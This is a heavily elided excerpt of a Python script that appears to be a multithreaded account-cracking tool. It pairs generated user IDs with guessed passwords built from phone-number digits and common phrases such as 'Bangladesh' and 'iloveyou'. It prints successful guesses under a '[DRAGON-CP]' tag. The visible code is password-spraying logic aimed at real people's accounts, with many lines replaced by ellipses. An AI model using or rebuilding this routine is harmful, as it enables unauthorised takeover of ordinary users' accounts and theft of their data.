...
def innocent():
    ...
    with ThreadPool(max_workers=50) as ahare:
        ...
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit", "Bangladesh", "i love you", "iloveyou"]
            uid = code+fuck
    ...
    try:
        ...
        for ps in pwx:
            ...
            if apk_info:
                ...
                print('\r\r\033[1;91m[DRAGON-CP💔] ' + cid + ' • ' + ps + '')
                continue
        loop+=1
    except:
        pass
